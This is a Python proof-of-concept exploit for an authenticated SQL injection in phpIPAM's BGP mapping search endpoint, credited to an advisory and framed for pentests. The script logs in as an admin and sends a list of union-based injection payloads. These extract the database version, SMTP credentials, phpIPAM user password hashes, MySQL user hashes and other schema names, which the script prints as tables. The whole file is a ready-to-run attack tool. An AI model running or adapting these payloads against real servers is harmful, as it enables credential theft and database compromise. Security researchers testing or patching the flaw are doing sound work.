#!/usr/bin/env python
# -*- coding: utf-8 -*-


# The vulnerability was discovered by Oscar Uribe (https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155)
# https://fluidattacks.com/advisories/mercury/
# This is just a PoC to automate the execution of some easy payloads during the engagements/pentests



import requests
import sys
import argparse
import getpass
from bs4 import BeautifulSoup
from tabulate import tabulate
from termcolor import colored, cprint

# TODO: Update README.md
# TODO: Implement debug


def banner():
    print("""  ___  _  _  ____     ___   ___  ___   ___      ___   ___   ___    __    _  
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ \ ___(__ \ (__ ) / _ \  /. |  / ) 
( (__  \  /  )__)(___)/ _/( (_) )/ _/  / _/(___)/ _/  (_ \( (_) )(_  _)/ _ \\
 \___)  \/  (____)   (____)\___/(____)(____)   (____)(___/ \___/   (_) \___/
""")
    print("                                     Vulnerability discovered by Oscar Uribe")
    print("                                                 PoC author: @javicarabantes")



def usage():
    print("Usage: exploit.py --url https://the.ipam.server:1234 --username my-admin-user")
    print("Note: user has to be admin and password will be asked\n")


def generate_headers(csrftoken, phpipam_session):
    return {
        "Host": "localhost:8888",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "214",
        "Origin": "http://localhost:8888",
        "Connection": "close",
        "Referer": "http://localhost:8888/index.php?page=tools&section=routing&subnetId=bgp&sPage=1",
        "Cookie": f"csrftoken={csrftoken}; dojo-sidebar=max; phpipam={phpipam_session}; table-page-size=50",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }

def get_bgp_id():
    return 1

def login(session, login_url, ipamusername, ipampassword, csrftoken):

    headers = generate_headers(None, None)
    # We don't need the cookie for login
    headers.pop("Cookie")

    payload = {
        "ipamusername": ipamusername,
        "ipampassword": ipampassword
    }

    response = session.post(login_url, data=payload, headers=headers)

    if response.status_code == 200:
        if "Invalid username" in response.text:
            print("Bad credentials")
            sys.exit(1)

        if len(session.cookies.get_dict()) > 0 and "phpipam" in session.cookies.get_dict():
            return session.cookies.get_dict()['phpipam']
        else:
            print("no phpipam session returned")
            sys.exit(1)
    else:
        print(f"Status code was {response.status_code}. Check the URL")
        sys.exit(1)

def fetch_csrf_token():
    # Does not seem to be a requirement in phpipam 1.4.3
    return None


simple_payloads = [

    {
        "name": "Basic Server Info",
        "description": "Extracting current user, current DB and Mysql/MariaDB version",
        "sqli": '" union select user(), NULL, database(), version()-- -',
        "tabulate_headers": ["user", "database", "version"]
    },
    {
        "name": "PHPIpam SMTP Settings",
        "description": "Getting SMTP settings if set",
        "sqli": '" union select concat(mserver, 0x3A, mport), NULL, muser, mpass from settingsMail-- -',
        "tabulate_headers": ["server:port", "smtp_user", "smtp_password"]
    },
    {
        "name": "PHPIpam Users and hashes",
        "description": "Getting Other PHPIPAM users format: email::username::password and additional information",
        "sqli": '" union select concat(email, 0x3A, 0x3A, username, 0x3A, 0x3A, password), NULL, if(authMethod=1, \'mysql_user\', \'basic_http_user\'), if(domainUser=1, \'Domain user\', \'local_db_user\') from users-- -',
        "tabulate_headers": ["email_username_password", "authMethod", "domainUser"]
    },
    {
        "name": "MySQL db Users",
        "description": "Trying to extact users and hashed password from mysql.user tables if possible",
        "sqli": '" union select mysql.user.user, NULL, mysql.user.host, mysql.user.password from mysql.user-- -',
        "tabulate_headers": ["user", "host", "password"]
    },
    {
        "name": "Other schemas availables",
        "description": "Trying to extact other schemas the current user has access if possible",
        "sqli": '" union select group_concat(information_schema.schemata.schema_name), NULL, NULL, NULL from information_schema.schemata where information_schema.schemata.schema_name not in ("information_schema", "sys", "mysql", "performance_schema")-- -',
        "tabulate_headers": ["schema_list", "", ""]
    }
]



p = argparse.ArgumentParser()

p.add_argument("-d", action='store_true', help="Debug output", default=False)
p.add_argument("-q", action='store_true', help="Do not print the banner")
p.add_argument("--url", help="phpipam url: https://ipamserver:8081/", required=True)
p.add_argument("--username", help="admin user", required=True)

if ("-q" not in sys.argv):
    banner()

args = p.parse_args()


verbose = args.d
base_url = args.url
login_url = f"{base_url}/app/login/login_check.php"
sqli_url = f"{base_url}/app/admin/routing/edit-bgp-mapping-search.php"
ipampassword = getpass.getpass(prompt='phpipam password for your admin account: ')
ipamusername = args.username

session = requests.Session()
csrftoken = fetch_csrf_token()
bgp_id = get_bgp_id()

phpipam_session = login(session, login_url, ipamusername, ipampassword, None)


headers = generate_headers(csrftoken, phpipam_session)

for obj in simple_payloads:
    cprint(f"\n\n[+] Name: {obj['name']} - {obj['description']}\n", "green")

    sqli = obj['sqli']

    payload = {
        "subnet": sqli,
        "bgp_id": bgp_id
    }

    response = requests.post(sqli_url, data=payload, headers=headers)
    if verbose: print(response.text)
    bs = BeautifulSoup(response.text, "lxml")


    response_tr = bs.find_all("tr")
    
    table = []

    if len(response_tr) == 0:
        alert = bs.find("div").get_text()
        print(colored(f"[-] {alert}", "red"))

    # if we got more than one result, we have to loop for tr first
    for tr in response_tr:
        response_td = tr.find_all("td")
        #print(len(response_td))

        # We got results
        if len(response_td) > 0:
            
            # as we use tabulate to pretty print the results
            # we want to create 3 columns but the hash of phpipam users might give some problems. We need to split the response and format each column
            output = response_td[2].get_text()
            output = output.strip()
            
            # last column
            space_splitting = output.split(" ")
            col2 = space_splitting[1].replace("(", "").replace(")", "")
            
            # middle column
            slash_chunk = space_splitting[0]
            aux = slash_chunk.split("/")
            col1 = aux[len(aux) - 1]
                
            
            # removing the last part (which is part of the col1) and join with / which may be part of the hash
            aux.pop()
            col0 = "/".join(aux)
            
            row = [ col0, col1, col2]
            table.append(row)


    print(tabulate(table, headers=obj['tabulate_headers'], showindex="always", tablefmt="presto"))



sys.exit(0)